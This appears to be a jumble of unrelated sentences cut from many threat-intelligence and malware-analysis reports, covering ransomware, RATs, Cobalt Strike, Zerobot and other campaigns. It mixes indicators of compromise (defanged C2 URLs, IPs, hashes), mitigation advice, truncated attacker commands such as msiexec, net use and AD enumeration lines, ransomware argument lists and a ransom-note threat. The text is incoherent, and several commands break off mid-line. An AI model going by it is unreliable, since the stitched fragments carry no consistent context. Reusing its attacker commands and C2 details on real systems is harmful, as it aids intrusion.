Remote URL: https://bankofamerica.us[.]org/lsizTZCslJm/W+Ltv_Pa/qUi+KSaD/_rzNkkGuW6/cQHgsE= Created payload path:
Monitor events for changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728, and 4670.
EaVpPBNXgAE8s3r.jpgFigure 35.
Example of how some of these arguments are used: cy.exe --run=1234 --nomutex=0 --log=1 --nodel=1 --path="C:\Myfolder"
T1070 Indicator Removal on Host As with many other ransomware groups, Vice Society attempts to clear system, security and application logs on compromised machines. 
Letter Head.docx Upon checking the download link, we discovered that it was the same password-protected archive file that we found on VirusTotal earlier. 
website_battlestategames.pngFigure 36.
Remote Services:
Technical Analysis Black Basta Malware Overview
The subdirectories to the fathomed directory, elude, omicron, and shabbily, are all empty as confirmed by navigating to them and running "ls -a" and returning no files.
3A63477A078CE10E53DFB5639E35D74F93CEFA81HSBC_job_offer․pdfLinux/NukeSped.
DO msiexec -c /Q /i 
Other targeted sectors include healthcare and nongovernmental organizations (NGOs). 
This proxied traffic reported back the hostname of the threat actors machine as “mikespc”.
Now, let’s look at these four tools: a packer, crypter, protector, and a loader. 
The scripts also rely heavily on the usage of mktemp to generate variables within the scripts.
In addition, loaders can be used to set persistence and additional components needed for the execution of the malware.
The connections were proxied through the IcedID process. 
The base64 encoding starts with JAB that is a common pattern for UTF-16 starting with $.
[MITRE ATT&CK]
Ensure secure configurations for devices: Change the default password to a strong one, and block SSH from external access.
Sandals does not write the Fantasy wiper to remote systems.
The different operational groups manage their own methods of entry and privilege escalation, demonstrating a high degree of specialization within each group. 
WebClient 
Sign up to receive the latest news, cyber threat intelligence and research from us 
In this case, process hollowing was used to inject a malicious PE file into the legitimate process called aspnet_compiler.exe.
In X-Force’s analysis of recent RokRAT-related files, in lieu of a ZIP file, we found Optical Disc Image files (ISO) containing LNK files that had slightly modified PowerShell scripts, and Hangul Word Processor decoy documents (HWP). 
We will provide technical details on how the LokiBot sample uses obfuscation and a persistence mechanism to avoid detection.
It then processes data received from the connecting client, parsing expected commands from the following HTTP header fields: X-siLock-Step1, X-siLock-Step2, and X-siLock-Step3. X-siLock-Step1 Command SequenceIf the value of the header field X-siLock-Step1 is -1, LEMURLOOT retrieves and returns the Azure system settings from MOVEit Transfer, including the configured Azure Blog storage account, and its associated key and container (AzureBlobStorageAccount, AzureBlobKey, and AzureBlobContainer).
Some of the functionalities supported by XWorm v3.1 Figure 7.
powershell.exe get-ADcomputer -Filter * | Where-Object {$a=$_.name; $_.DistinguishedName
The team used HTTPS reverse proxies to redirect C2 traffic between target network and the team’s Cobalt Strike servers. 
Note that these temporary solutions should not be treated as permanent fixes; vulnerable components should be upgraded to the latest build as soon as possible. 
Leaders Implement a training program to familiarize users with identifying social engineering techniques and phishing emails. 
ADGet : An uncommon tool An Active Directory collection tool called ADGet was dropped into a user’s temp folder and executed with an output filename argument.
Right after the beacon was executed, the threat actors began enumerating the network using native Windows binaries and the PowerView module, Invoke-ShareFinder.
Sandals is a 32-bit Windows executable written in C#/.NET.
Mitigation: Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services.
The impst.sh script used to download the remote administration toolDefending devices and networks against Zerobot The continuous evolution and rapid addition of new capabilities in the latest Zerobot version underscores the urgency of implementing comprehensive security measures.
We will continue analyzing the deployed implants to find out more details about the toolset used in the supply chain attack. 
An installer for macOS has also been trojanized. 
Mitigation: Use MFA for remote logins [M1032]. 
On each usage of this feature, a remote service was created with random alphanumeric characters, service name and service file name, e.g. “<7-alphanumeric-characters>.exe”. 
This is because a current or recent Chrome session to the victim’s cloud tenants would be potentially beneficial in the hijacking of sessions that the threat actor performed in order to access the victim’s cloud resources. 
T1566.002Phishing:
In all the IronPython scripts we found, only the native payload to native remote process injection option is used. 
-s AudioEndpointBuilder win_cobalt_strike_auto BEACHHEAD 2220 winlogon.exe winlogon.exe win_cobalt_strike_auto BEACHHEAD 7032 rundll32.exe C:\Windows\syswow64\rundll32.exe win_cobalt_strike_auto SERVERC 3328 
To avoid the risk of detection by antivirus (AVs) or endpoint detection and response (EDR), the tool downloads the files and decrypts them locally.
Following locations are accessed by the information stealer: Google Chrome – AppData\Local\Google\Chrome\User Data Microsoft Edge – AppData\Local\Microsoft\Edge\User Data Brave Browser – AppData\Local\BraveSoftware\Brave-Browser\User Data Mozilla Firefox – AppData\Roaming\Mozilla\Firefox\Profiles Fig.10 System data collection -1 Fig.10 System data collection -2 Qualys Detection & Protection 
The RAT employs anti-debugging techniques by leveraging Windows Management Instrumentation (WMI) to identify the system’s manufacturer.
By: Trend Micro March 27, 2023Read time: ( words) Save to Folio Subscribe Since 2022, we’ve been following a series of cyberespionage efforts carried out by multiple groups carried from an old campaign.
Monitor for processes that can be used to discover remote systems, such as ping.exe and tracert.exe, especially when executed in quick succession. 
This 1st-stage attack is intended to gain initial access into a fully patched macOS system to pave the way for the 2nd-stage attack in the future.
Notifications or responsibility of victims by LAPSUS$ are commonly reported via their telegram channel and in one case a victim’s DNS records were reconfigured to LAPSUS$ controlled domains/websites.
This backdoor appears to be implementing intentional functionality and would require a firmware update to completely remove it from affected systems.
The first new method the group adopted is aimed at evading the Mark-of-the-Web (MOTW) flag, the security measure whereby Windows displays a warning message when the user tries to open a file downloaded from the internet.
The Zip archive has a filename that includes the last name of the fictitious person whose purportedly sent the initial email message. 
The link to download: https://github.com/ncsgroupvn/NCSE0Scanner Indicators of Compromise (IOCs) Webshell: 
Network Service Discovery [T1046] Network Monitoring and Analysis Tools Intrusion Detection or Prevention Systems Endpoint Protection Platform Detect target hosts and ports Identify associated scanning process Analyze scanning host once detected Develop response plan None Comprehensive Active Directory and Host Enumeration Perform AD enumeration by querying all domain objects from the DC; and enumerating trust relationships within the AD Forest, user accounts, and current session information from every domain computer (Workstation and Server). 
The team’s C2 redirectors used HTTPS reverse proxies to redirect C2 traffic. 
The C&C server is hardcoded, in cleartext, in the sample; in this specific case, it is set to 114.118.83[.]141. 
Power-off and segregate any other computers or devices that share a network with the infected computer(s) that have not been fully encrypted by ransomware.
[T1018] Chinese state-sponsored cyber actors have been observed using Base-64 encoded commands, including ping, net group, and net user to enumerate target network information. 
Monitor for changes in system DLLs not associated with updates or patches. 
The first payload retrieved from the PUBLOAD HTTP variant After decryption, it then checks if the first byte of the decrypted payload is 0x06.
Its most highly targeted industry verticals include professional services, construction, wholesale and retail and manufacturing. Figure 5.
If a task with the same name already exists, it is deleted before the new one is created.
The dll is run using the command “rundll32.exe SuperFrtch.dll, #1”.
Finally, it queues an APC into the patched GlobalGetAtomA to get the payload running. Figure 14.
Learn what it means to have an elite team of Threat Hunters and Researchers that works for you.
Updated method #2: Scripts and novel downloader 
Similarly to the session_secret generation, this structure is identical to that of the REvil samples analyzed by Amossys, further showing that there have been very few changes to the REvil source code when developing Ransom Cartel samples. 
Figure 4 – settings.xml.rels file content Once a successful connection to the remote server is established, a malicious template file is downloaded and executed.
Approximately 4 days after the initial infection, new activity on the host provided a clear distinction of a threat actor performing manual actions (hands on keyboard).
Banking Trojan Techniques How Financially Motivated Malware Became Infrastructure
The following table shows the configuration parameters in the audit event related to this change: NameValue“Name”“Ran_jBelh”“Enabled”“True”“CloudServicesMailEnabled”“True”“RestrictDomainsToCertificate”“False”“SenderDomains”“smtp:*;1”“SenderIPAddresses”“170.75.174.97;170.75.172.8;170.75.170.69;170.75.174.95; 54.39.94.145;149.56.200.36;158.69.21.185;66.70.201.131”“RestrictDomainsToIPAddresses”“True”“ConnectorSource”“HybridWizard”“EFSkipIPs”“170.75.174.97;170.75.172.8;170.75.170.69;170.75.174.95; 54.39.94.145;149.56.200.36;158.69.21.185;66.70.201.131”“TreatMessagesAsInternal”“False”“ConnectorType”“OnPremises”“RequireTls”“False”Create transport rules Transport rules (also known as mail flow rules) are sets of actions that can be taken on any mail that flows in the organization.
Apart from those details, this stage is identical to the Shellcode #2 from the newer version. 
Almost all the compromised websites were developed by the same Ukranian IT company, Kitsoft, and all of them were built on OctoberCMS.
First time that I see #Conti ransomware spread as a DLL :Hash : 5c278c04bb19196dc8559d45b9728b3ba0c1bc5cdd20a766f56248e561c6f5a6 Pdb : A:sourceconti_v3x64Releasecryptor_dll.pdb (cc @GrujaRS @malwrhunterteam )
So, what’s new in this blogpost? 
Additionally, the threat actor viewed pages related to internal business operations such as development schedules and points of contact.
Custom hash function seen in X4 The orchestrator handles seven commands, detailed in Table 3.
C:\Windows\system32\cmd.exe /C
This suggests that the threat actor was beginning its tests, naming these files “demo” or “test,” upon decompiling the AutoIt script into a human-readable script that supports the timeline of this attack campaign. 
The first task is triggered at log-on.
Other malleable profile rules include CobaltStrike Malformed UAs in Malleable Profiles, CobaltStrike Malleable (OCSP) Profile, and CobaltStrike Malleable OneDrive Browsing Traffic Profile. 
Implement activities to detect and investigate anomalies in VPN access.
Geographical Impact Vice Society is primarily opportunistic, and its targets have included organizations across the globe.
Attackers make every attempt to scam taxpayers for financial gain and data exfiltration for future attacks.
Then it sends an HTTP POST request with the name of the victim's computer to a server at hxxp://www.therockbrazil.com.br/assinaturas/logs.php. 
Malspam Pushing The DarkComet RAT (August 28, 2018) 
Analysis showed that the victim IP address was publicly serving a web service that contained a phpMyAdmin database.
To identify potential data exfiltration, additionally identify unusual host outbound traffic patterns. 
The initial infection starts with the user searching for installers such as Zoom, TeamViewer, AnyDesk, or FileZilla.
GetEncoding(936).GetString(System.
Defenders will have to inspect the traffic data and look for suspicious DNS records. 
####### Not much explanation is needed here, you can change the certificate information to your heart's content.
This command is a built-in Cobalt Strike command that is used to get SYSTEM privileges.
16 Returns the list of images (EXE/DLL files) loaded into the current process. 
T1027.003Obfuscated Files or Information:
The team impersonated several accounts to evade detection while moving.
Crypto and NFT Communities Are Prime Targets Since May 2021, we have observed several malware distribution campaigns. 
Note: see the appendix for a list of the domains, file names, and malware MD5 hash values used to facilitate this activity. 
The downloaded note.hta uses PowerShell to download another remote file hosted on hxxp://datacenter002[.]myftp[.]biz/documents/note[.]gif, which was not available at the time of our investigation.
LockBit 20 How This RaaS Operates and How to Protect Against It
Andromeda is a custom packer that makes reverse-engineering more difficult. 
, I still found this a little bit surprising and wanted to share. 
The spam tool and newly identified Horabot are employed in the attack to compromise the victim’s mailboxes, steal their contact’s email addresses, and send phishing emails to the victim’s contacts.
Palo Alto Networks customers receive protections against LockBit 2.0 attacks from Cortex XDR, as well as from the WildFire cloud-delivered security subscription for the Next-Generation Firewall.
Argument Description -path {target path} If provided, will only encrypt the contents of the target path -id {32-byte characters} Will be used as the victim’s ID, which will be appended on the TOR link found in the dropped ransom note.
Goodware String - occured 1 times */ $s3 = "H9CPtgL9{@tafD9{8tZD" fullword ascii $s4 = "expand 32-byte k" fullword ascii /*
The fernet_decrypt function decrypts an encrypted string representing the Ngrok AUTH Token using a harcoded password.
Proxy CISA observed activity from Tor that has resulted in confirmed compromises of internet-facing Federal Government agency systems. 
It imports the specified Active Directory database NTDS.dit and registry file SYSTEM and exports the found password hashes into RecordedTV_pdump.txt and user details in RecordedTV_users.csv. 
"C: & cd \ & net use \\<redacted_internal_ip> /u:<redacted_username> <redacted_password>" cmd /C
The purpose of this shellcode is to load and execute in memory the embedded DLL by calling an export function of the DLL named SignalChromeElf.
T1083File and Directory DiscoveryDolphin can obtain file and directory listings. 
As with HTTP/HTTPS traffic, DNS traffic can be randomized using malleable C2 profiles.
It creates a new thread, in which a new mutex is created with the name 56rd68kow.
Default is C:.No -ps <filepath>Location of PsExec on disk.
EMVAKorplug dropper. 
Account Manipulation Adds newly created accounts to the administrators group to maintain elevated access. T1547.001.
When performing analysis on the UAL, CrowdStrike used the ClientAppId value within the MailItemsAccessed operation and cross-correlated with the Application ID of the compromised service principal to see what activities were performed by the threat actor. 
Attribution EclecticIQ analysts assess with moderate confidence that the infrastructure was operated by a Chinese threat actor.
InventoryManager and is invoked by a sequence of methods that can be traced back to the CoreBusinessLayerPlugin class.
/!autorun Skips creation of registry keys for persistence /test_cid “test” Overwrites default victim generated CID and replace with “test” value /test_vid “test” Overwrites default VID and replace with “test” value /p, /path
This is a PowerPoint file (PPT) containing two slides with the same content, the first one written in English and the second in French.
This threat actor employs tactics such as LOLBaS (Living Off the Land Binaries and Scripts), along with CMD-based scripts to carry out its malicious activities. 
Since that year, we observed a decreasing detection rate of FinSpy for Windows.
Keep in mind that once your data appears on our leak site, it could be bought by your competitors at any second, so don't hesitate for a long time.
Meanwhile, organizations should also consider cutting edge multilayered defensive strategy and comprehensive security solutions such as Trend Micro:trade_mark: XDR that can detect, scan, and block malicious URLs across the modern threat landscape. Indicators of Compromise (IOCs) 
More details on the Content Hub can be found here: https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy Indicators of compromise (IOCs): Domains and IP addresses: zero[.]sudolite[.]ml 176.65.137[.]5 176.65.137[.]5:1401 176.65.137[.]6 ws[:]//176.65.137[.]5/handle http[:]//176.65.137[.]5:8000/ws New Zerobot hashes (SHA-256) aed95a8f5822e9b1cd1239abbad29d3c202567afafcf00f85a65df4a365bedbb bf582b5d470106521a8e7167a5732f7e3a4330d604de969eb8461cbbbbdd9b9a 0a5eebf19ccfe92a2216c492d6929f9cac72ef37089390572d4e21d0932972c8 
Upon execution, the malware initializes configuration and sets up its working directory. Figure 37.
[IOC]MD5 – 93fc0fb9b87a00b38f18c1cc4ee02e50 C2 – hxxp://ingarchi.com/bbs/data/culture– hxxp://ingarchi.com/bbs/data/culture/getcfg.php AhnLab EDR protects the endpoint environment by delivering behavioral detection, advanced analysis, holistic visibility, and proactive threat hunting.
This is done by writing both the Windows API address and the arguments at the required offsets inside the counterfeit object. 
They can be invoked via IO control codes or by writing to specific registry keys. 
The attacker executed C:\ProgramData\Cisco Systems\Cisco Jabber\update.exe using Command Prompt. 
on systems residing in the same subnet. 
This packer supports various anti-analysis operations such as disabling Windows Defender, checking for security products, and detecting virtual environments and sandboxes. 
